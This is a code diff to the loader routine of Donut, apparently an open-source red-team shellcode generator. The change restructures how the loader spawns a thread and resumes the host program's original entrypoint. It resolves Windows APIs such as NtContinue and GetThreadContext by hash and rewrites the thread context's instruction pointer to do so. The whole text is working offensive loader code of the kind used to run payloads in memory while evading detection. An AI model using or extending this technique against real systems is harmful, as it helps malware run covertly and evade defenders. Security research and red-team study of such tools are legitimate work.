@@ -42,8 +42,8 @@ HANDLE DonutLoader(PDONUT_INSTANCE inst) {
     HANDLE             h = NULL;
     CONTEXT            c;
     
-    // create a new thread for shellcode?
-    if(inst->fork) {
+    // create thread and execute original entrypoint?
+    if(inst->oep != 0) {
       DPRINT("Resolving address of CreateThread");
       hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.CreateThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
       _CreateThread = (CreateThread_t)xGetProcAddress(inst, hash, inst->iv);
@@ -58,34 +58,31 @@ HANDLE DonutLoader(PDONUT_INSTANCE inst) {
         return (HANDLE)-1;
       }
       
-      // execute original entrypoint?
-      if(inst->oep != 0) {
-        DPRINT("Resolving address of NtContinue");
-        hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtContinue) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-        _NtContinue = (NtContinue_t)xGetProcAddress(inst, hash, inst->iv);
-        
-        DPRINT("Resolving address of GetThreadContext");
-        hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetThreadContext) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-        _GetThreadContext = (GetThreadContext_t)xGetProcAddress(inst, hash, inst->iv);
+      DPRINT("Resolving address of NtContinue");
+      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtContinue) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+      _NtContinue = (NtContinue_t)xGetProcAddress(inst, hash, inst->iv);
+      
+      DPRINT("Resolving address of GetThreadContext");
+      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetThreadContext) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+      _GetThreadContext = (GetThreadContext_t)xGetProcAddress(inst, hash, inst->iv);
 
-        DPRINT("Resolving address of GetCurrentThread");
-        hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetCurrentThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-        _GetCurrentThread = (GetCurrentThread_t)xGetProcAddress(inst, hash, inst->iv);
-        
-        if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
-          c.ContextFlags = CONTEXT_FULL;
-          _GetThreadContext(_GetCurrentThread(), &c);
-          #ifdef _WIN64
-            c.Rip = inst->oep;
-            c.Rsp &= -16;
-          #else
-            c.Eip = inst->oep;
-            c.Esp &= -4;
-          #endif
-          DPRINT("Calling NtContinue");
-          //__debugbreak();
-          _NtContinue(&c, FALSE);
-        }
+      DPRINT("Resolving address of GetCurrentThread");
+      hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetCurrentThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+      _GetCurrentThread = (GetCurrentThread_t)xGetProcAddress(inst, hash, inst->iv);
+      
+      if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
+        c.ContextFlags = CONTEXT_FULL;
+        _GetThreadContext(_GetCurrentThread(), &c);
+        #ifdef _WIN64
+          c.Rip = inst->oep;
+          c.Rsp &= -16;
+        #else
+          c.Eip = inst->oep;
+          c.Esp &= -4;
+        #endif
+        DPRINT("Calling NtContinue");
+        //__debugbreak();
+        _NtContinue(&c, FALSE);
       }
     } else {
       // execute in existing thread
